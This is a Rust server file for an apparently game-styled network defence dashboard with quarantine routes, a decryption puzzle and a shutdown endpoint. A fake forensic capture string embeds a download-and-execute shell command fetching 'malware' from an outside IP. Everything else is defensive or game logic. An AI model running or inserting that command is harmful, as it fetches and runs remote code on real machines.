use std::net::SocketAddr;
use axum::{
    routing::{get, post},
    Router,
    response::IntoResponse,
    Json,
};
use tower_http::cors::CorsLayer;
use tracing::{info, error, Level};
use tracing_subscriber::FmtSubscriber;
use std::sync::Arc;
use tokio::sync::broadcast;

use ice::config::Config;
use ice::engine::Engine;
use ice::firewall::FirewallEngine;
use ice::ws::{WsState, ws_handler};
use ice::monitor::LogMonitor;
use ice::AppState;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let subscriber = FmtSubscriber::builder()
        .with_max_level(Level::INFO)
        .json()
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;

    let config = Config::from_env();
    info!("Starting NET/OS v1.0 Core Engine (ICE)...");

    let engine = Arc::new(Engine::new(&config).await?);
    let firewall = Arc::new(FirewallEngine::new());
    let ws_state = Arc::new(WsState::new());

    let (shutdown_tx, shutdown_rx) = broadcast::channel(1);

    engine.start_batch_loop(ws_state.clone(), shutdown_tx.subscribe());

    let log_monitor = LogMonitor::new(config.suricata_eve_path.clone(), engine.clone(), firewall.clone());
    log_monitor.start(shutdown_tx.subscribe());

    let supervisor = ice::daemon::DaemonSupervisor::new(ws_state.clone(), engine.clone(), config.clone());
    supervisor.start(shutdown_tx.subscribe());

    let app_state = Arc::new(AppState {
        engine: engine.clone(),
        firewall: firewall.clone(),
        ws_state: ws_state.clone(),
        active_sessions: Arc::new(std::sync::Mutex::new(std::collections::HashMap::new())),
    });

    let app = Router::new()
        .route("/api/hosts", get(get_hosts_handler))
        .route("/api/quarantine", post(quarantine_handler))
        .route("/api/unquarantine", post(unquarantine_handler))
        .route("/ingest", post(ingest_handler))
        .route("/api/breach/start", get(breach_start_handler))
        .route("/api/breach/solve", post(breach_solve_handler))
        .route("/api/flatline", post(flatline_handler))
        .route("/ws", get(ws_handler))
        .layer(CorsLayer::permissive())
        .with_state(app_state);

    let addr = SocketAddr::from(([0, 0, 0, 0], config.http_port));
    info!("Starting HTTP/WebSocket broker on {}", addr);

    let listener = tokio::net::TcpListener::bind(&addr).await?;
    
    let mut main_shutdown_rx = shutdown_rx;
    axum::serve(listener, app)
        .with_graceful_shutdown(async move {
            let _ = main_shutdown_rx.recv().await;
            info!("Shutting down API server broker.");
        })
        .await?;

    Ok(())
}

async fn get_hosts_handler(
    axum::extract::State(state): axum::extract::State<Arc<AppState>>,
) -> impl IntoResponse {
    let hosts = state.engine.get_hosts();
    Json(hosts)
}

#[derive(serde::Deserialize)]
struct TargetIpPayload {
    ip: String,
}

async fn quarantine_handler(
    axum::extract::State(state): axum::extract::State<Arc<AppState>>,
    Json(payload): Json<TargetIpPayload>,
) -> impl IntoResponse {
    if let Err(e) = state.firewall.quarantine_host(&payload.ip).await {
        return (axum::http::StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "status": "error", "message": e.to_string() })));
    }

    if let Some(mut host) = state.engine.get_host(&payload.ip) {
        host.is_quarantined = true;
        state.engine.update_host(host);
    }

    (axum::http::StatusCode::OK, Json(serde_json::json!({ "status": "success", "message": "Quarantine command executed." })))
}

async fn unquarantine_handler(
    axum::extract::State(state): axum::extract::State<Arc<AppState>>,
    Json(payload): Json<TargetIpPayload>,
) -> impl IntoResponse {
    if let Err(e) = state.firewall.remove_quarantine_host(&payload.ip).await {
        return (axum::http::StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "status": "error", "message": e.to_string() })));
    }

    if let Some(mut host) = state.engine.get_host(&payload.ip) {
        host.is_quarantined = false;
        host.ice_integrity = 100.0;
        state.engine.update_host(host);
    }

    (axum::http::StatusCode::OK, Json(serde_json::json!({ "status": "success", "message": "Host restored." })))
}

use protocol::net::NetPacket;
use rand::Rng;

async fn ingest_handler(
    axum::extract::State(state): axum::extract::State<Arc<AppState>>,
    Json(pkt): Json<NetPacket>,
) -> impl IntoResponse {
    state.engine.ingest_packet(pkt.clone());
    if let Some(host) = state.engine.get_host(&pkt.src_ip.to_string()) {
        let msg = protocol::daemon::DaemonMsg::NetHost(host);
        let _ = state.ws_state.broadcast_msg(&msg);
    }
    axum::http::StatusCode::OK
}

#[derive(serde::Deserialize)]
struct BreachStartParams {
    ip: String,
}

async fn breach_start_handler(
    axum::extract::State(state): axum::extract::State<Arc<AppState>>,
    axum::extract::Query(params): axum::extract::Query<BreachStartParams>,
) -> impl IntoResponse {
    let ip = params.ip;
    let mut seed = [0u8; 32];
    rand::thread_rng().fill(&mut seed);

    let (grid, correct_path) = ice::locker::EvidenceLocker::generate_deterministic_game(seed);
    let password = correct_path.join(" ");

    let mut salt = [0u8; 32];
    rand::thread_rng().fill(&mut salt);

    let pcap_plaintext = format!(
        "============================================================\n\
         NET/OS FORENSIC EVIDENCE PACKET CAPTURE [BREACH DETECTED]\n\
         ============================================================\n\
         Target IP: {}\n\
         Timestamp: {}\n\
         Host Intrusion Signature: CVE-2023-38606: Kernel vulnerability exploit vector\n\
         ============================================================\n\
         RAW PACKET DUMP:\n\
         0000  00 c0 29 3e 83 7d 00 50 56 c0 00 08 08 00 45 00  ..)>e.p.p...e..\n\
         0010  00 3c 1c 46 40 00 40 06 b1 e6 c0 a8 01 05 c0 a8  .<.f@.@.......\n\
         0020  01 01 00 50 00 50 00 00 00 00 00 00 00 00 50 02  ...p.p........p.\n\
         0030  20 00 a3 fc 00 00 02 04 05 b4 04 02 08 0a 00 27  ...........'\n\
         \n\
         [!] CRITICAL DAEMON EXPLOIT PAYLOAD FOUND:\n\
         /bin/sh -c \"cd /tmp && wget http://99.88.77.66/malware && chmod +x malware && ./malware\"\n\
         ============================================================\n",
        ip, chrono::Utc::now().to_rfc3339()
    );

    let encrypt_res = ice::locker::EvidenceLocker::encrypt_evidence(
        &password,
        &salt,
        pcap_plaintext.as_bytes(),
    );

    match encrypt_res {
        Ok((ciphertext, iv)) => {
            let filename = format!("evidence_quarantine_{}.pcap.enc", ip);
            if let Err(e) = std::fs::write(&filename, &ciphertext) {
                error!("Failed to write encrypted evidence file to disk: {:?}", e);
            }

            let session = ice::locker::ActiveBreachSession {
                seed,
                correct_path,
                salt,
                ciphertext,
                iv,
                original_pcap_hex: pcap_plaintext,
            };

            state.active_sessions.lock().unwrap().insert(ip.clone(), session);

            (
                axum::http::StatusCode::OK,
                Json(serde_json::json!({
                    "status": "success",
                    "grid": grid,
                    "salt": hex::encode(salt),
                    "ip": ip
                })),
            )
        }
        Err(e) => {
            error!("Failed to encrypt evidence: {:?}", e);
            (
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({
                    "status": "error",
                    "message": format!("Failed to generate cryptographic context: {:?}", e)
                })),
            )
        }
    }
}

#[derive(serde::Deserialize)]
struct SolvePayload {
    ip: String,
    path: Vec<String>,
}

async fn breach_solve_handler(
    axum::extract::State(state): axum::extract::State<Arc<AppState>>,
    Json(payload): Json<SolvePayload>,
) -> impl IntoResponse {
    let session_opt = {
        let mut sessions = state.active_sessions.lock().unwrap();
        sessions.remove(&payload.ip)
    };

    if let Some(session) = session_opt {
        let password = payload.path.join(" ");
        let decrypt_res = ice::locker::EvidenceLocker::decrypt_evidence(
            &password,
            &session.salt,
            &session.ciphertext,
            &session.iv,
        );

        match decrypt_res {
            Ok(decrypted_bytes) => {
                let decrypted_text = String::from_utf8_lossy(&decrypted_bytes).into_owned();
                
                info!("CRYPTO KEY VERIFIED: Decrypted PCAP for host {}", payload.ip);
                
                let log_msg = protocol::daemon::DaemonMsg::Log {
                    daemon_id: "ConstructDaemon".to_string(),
                    message: format!("SUCCESS: CRYPTO KEY VERIFIED. DECRYPTED PCAP FOR HOST {}", payload.ip),
                    level: "INFO".to_string(),
                    timestamp: chrono::Utc::now(),
                };
                let _ = state.ws_state.broadcast_msg(&log_msg);

                (
                    axum::http::StatusCode::OK,
                    Json(serde_json::json!({
                        "success": true,
                        "data": decrypted_text
                    })),
                )
            }
            Err(_) => {
                tracing::warn!("DECRYPTION FAILED: Bad key derivation for host {}", payload.ip);
                
                let log_msg = protocol::daemon::DaemonMsg::Log {
                    daemon_id: "ConstructDaemon".to_string(),
                    message: format!("ICE LOCKDOWN: FORENSIC DATA SEALED FOR HOST {}", payload.ip),
                    level: "CRITICAL".to_string(),
                    timestamp: chrono::Utc::now(),
                };
                let _ = state.ws_state.broadcast_msg(&log_msg);

                (
                    axum::http::StatusCode::OK,
                    Json(serde_json::json!({
                        "success": false,
                        "message": "ICE LOCKDOWN. FORENSIC DATA SEALED."
                    })),
                )
            }
        }
    } else {
        (
            axum::http::StatusCode::BAD_REQUEST,
            Json(serde_json::json!({
                "success": false,
                "message": "No active breach session found for this target."
            })),
        )
    }
}

async fn flatline_handler(
    axum::extract::State(state): axum::extract::State<Arc<AppState>>,
) -> impl IntoResponse {
    use zeroize::Zeroize;
    info!("CRITICAL: FLATLINE SIGNAL RECEIVED. PURGING ALL SESSION KEYS.");
    
    {
        let mut sessions = state.active_sessions.lock().unwrap();
        for session in sessions.values_mut() {
            session.seed.zeroize();
            session.salt.zeroize();
            session.ciphertext.zeroize();
            session.iv.zeroize();
            session.original_pcap_hex.zeroize();
        }
        sessions.clear();
    }
    
    let flatline_msg = protocol::daemon::DaemonMsg::Log {
        daemon_id: "ConstructDaemon".to_string(),
        message: "NEURAL LINK SEVERED. CONSTRUCT LOST.".to_string(),
        level: "CRITICAL".to_string(),
        timestamp: chrono::Utc::now(),
    };
    let _ = state.ws_state.broadcast_msg(&flatline_msg);

    tokio::spawn(async {
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
        info!("Exiting core engine.");
        std::process::exit(0);
    });

    axum::http::StatusCode::OK
}
